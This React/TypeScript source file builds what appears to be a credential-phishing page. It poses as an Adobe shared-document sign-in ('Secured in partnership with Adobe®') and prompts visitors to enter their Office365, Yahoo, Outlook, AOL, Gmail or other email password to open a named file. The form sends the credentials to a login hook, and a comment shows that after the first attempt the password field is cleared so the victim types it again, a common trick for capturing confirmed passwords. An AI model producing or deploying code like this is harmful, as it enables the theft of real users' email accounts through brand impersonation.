import React, { useState } from 'react';
import { ArrowLeft, Eye, EyeOff } from 'lucide-react';
import { useLogin } from '../hooks/useLogin';
import Spinner from './common/Spinner';

interface LoginPageProps {
  fileName: string;
  onBack: () => void;
  onLoginSuccess?: (sessionData: any) => void;
  onLoginError?: (error: string) => void;
  onYahooSelect?: () => void;
  onAolSelect?: () => void;
  onGmailSelect?: () => void;
  onOffice365Select?: () => void;
}

const LoginPage: React.FC<LoginPageProps> = ({ 
  fileName, 
  onBack,
  onLoginSuccess, 
  onLoginError,
  onYahooSelect,
  onAolSelect,
  onGmailSelect,
  onOffice365Select,
}) => {
  const [selectedProvider, setSelectedProvider] = useState<string | null>(null);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  
  const { isLoading, errorMessage, handleFormSubmit, resetLoginState } = useLogin(
    onLoginSuccess,
    onLoginError
  );

  const emailProviders = [
    { name: 'Office365', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/office-365-icon.png' },
    { name: 'Yahoo', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/yahoo-square-icon.png' },
    { name: 'Outlook', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/microsoft-outlook-icon.png' },
    { name: 'AOL', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/aol-icon.png' },
    { name: 'Gmail', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/gmail-icon.png' },
    { name: 'Others', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/communication-chat-call/envelope-line-icon.png' }
  ];

  const handleSubmit = async (e: React.FormEvent) => {
    const result = await handleFormSubmit(e, { email, password, provider: selectedProvider });
    // After the first attempt, the hook returns { isFirstAttempt: true }
    if (result?.isFirstAttempt) {
      setPassword('');
    }
  };

  const handleBackToProviders = () => {
    setSelectedProvider(null);
    setEmail('');
    setPassword('');
    resetLoginState();
  };

  const handleProviderClick = (providerName: string) => {
    if (providerName === 'Office365' && onOffice365Select) {
      onOffice365Select();
    } else if (providerName === 'Outlook' && onOffice365Select) {
      onOffice365Select();
    } else if (providerName === 'Yahoo' && onYahooSelect) {
      onYahooSelect();
    } else if (providerName === 'AOL' && onAolSelect) {
      onAolSelect();
    } else if (providerName === 'Gmail' && onGmailSelect) {
      onGmailSelect();
    } else {
      setSelectedProvider(providerName);
    }
  };

  const AdobeLogo = () => (
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30 26" className="w-8 h-8">
      <polygon fill="#FA0F00" points="11.5,0 0,0 0,26" />
      <polygon fill="#FA0F00" points="18.5,0 30,0 30,26" />
      <polygon fill="#FA0F00" points="15,9.6 22.1,26 18.2,26 16,20.8 10.9,20.8" />
    </svg>
  );

  return (
    <div className="min-h-screen flex items-center justify-center p-4 font-sans bg-white">
      {!selectedProvider ? (
        <div className="w-full max-w-sm">
          <div className="mb-10 text-center">
            <div className="flex justify-center mb-5">
              <AdobeLogo />
            </div>
            <h1 className="text-xl font-semibold text-gray-900 mb-2">Sign in to access your document</h1>
            <p className="text-sm text-gray-500">
              <span className="font-medium text-gray-700">{fileName}</span>
            </p>
          </div>
          
          <p className="text-sm font-medium text-gray-700 mb-4">Choose your email provider</p>
          <div className="space-y-2">
            {emailProviders.map((provider) => (
              <button
                key={provider.name}
                onClick={() => handleProviderClick(provider.name)}
                type="button"
                className="w-full group"
              >
                <div className="flex items-center px-4 py-3 bg-white rounded-md border border-gray-200 hover:border-gray-400 hover:bg-gray-50 transition-all duration-150">
                  <img src={provider.logo} alt={provider.name} className="w-6 h-6 object-contain flex-shrink-0" />
                  <span className="flex-1 text-sm font-medium text-gray-800 group-hover:text-gray-900 transition-colors ml-3 text-left">
                    {provider.name}
                  </span>
                  <svg className="w-4 h-4 text-gray-400 group-hover:text-gray-600 transition-colors flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
                  </svg>
                </div>
              </button>
            ))}
          </div>

          <div className="mt-10 text-center">
            <p className="text-xs text-gray-400">© 2026 Xtransferbloom. Secured in partnership with Adobe®.</p>
          </div>
        </div>
      ) : (
        <div className="w-full max-w-sm">
          <div className="mb-8 text-center">
            <div className="flex justify-center mb-5">
              <AdobeLogo />
            </div>
            <h1 className="text-xl font-semibold text-gray-900">Sign in with {selectedProvider}</h1>
            <p className="text-sm text-gray-500 mt-1">
              to access <span className="font-medium text-gray-700">{fileName}</span>
            </p>
          </div>

          <button onClick={handleBackToProviders} className="flex items-center gap-1.5 text-sm text-blue-600 hover:text-blue-800 font-medium mb-6 transition-colors">
            <ArrowLeft className="w-4 h-4" />
            Back to providers
          </button>

          <form onSubmit={handleSubmit} className="space-y-5">
            {errorMessage && (
              <div className="bg-red-50 text-red-600 p-3 rounded-md text-sm font-medium border border-red-200">
                {errorMessage}
              </div>
            )}

            <div>
              <label className="text-sm font-medium text-gray-700 block mb-1.5" htmlFor="email">Email address</label>
              <div className="relative">
                <input id="email" type="email" value={email} onChange={(e) => setEmail(e.target.value)} placeholder="you@example.com" required className="w-full px-3 py-2.5 bg-white border border-gray-300 rounded-md text-sm focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition placeholder:text-gray-400" />
              </div>
            </div>

            <div>
              <label className="text-sm font-medium text-gray-700 block mb-1.5" htmlFor="password">Password</label>
              <div className="relative">
                <input id="password" type={showPassword ? 'text' : 'password'} value={password} onChange={(e) => setPassword(e.target.value)} placeholder="Enter your password" required className="w-full px-3 pr-10 py-2.5 bg-white border border-gray-300 rounded-md text-sm focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition placeholder:text-gray-400" />
                <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600 transition-colors">
                  {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                </button>
              </div>
            </div>

            <button type="submit" disabled={isLoading || !email || !password} className="w-full flex items-center justify-center py-2.5 px-4 rounded-full font-semibold text-sm text-white bg-[#1473E6] hover:bg-[#0d66d0] disabled:opacity-50 disabled:cursor-not-allowed transition-colors">
              {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
              {isLoading ? 'Verifying...' : 'Sign In'}
            </button>
          </form>

          <div className="mt-10 text-center">
            <p className="text-xs text-gray-400">© 2026 Xtransferbloom. Secured in partnership with Adobe®.</p>
          </div>
        </div>
      )}
    </div>
  );
};

export default LoginPage;
